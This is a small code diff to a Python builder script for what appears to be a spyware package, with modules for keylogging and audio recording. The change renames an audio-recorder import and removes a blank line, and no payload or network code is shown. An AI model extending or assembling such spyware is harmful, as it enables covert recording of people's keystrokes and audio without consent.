@@ -180,7 +180,7 @@ def generate_code(output_filename):
 
     if include_AudioRecorder:
         with open(output_filename, "a") as f:
-            f.write("\nfrom SpyWare.AudioRecorder import Daemon as audioDaemon, audioConfig")
+            f.write("\nfrom SpyWare.AudioLogger import Daemon as audioDaemon, audioConfig")
 
     with open(output_filename, "a") as f:
         f.write("""
@@ -203,7 +203,6 @@ def run_all():
     threads = []
     config_paths = []
 """)
-
         if include_KeyLogger:
             f.write(f"""
     keylogger_conf = \"\"\"{keylogger_conf.strip()}\"\"\"
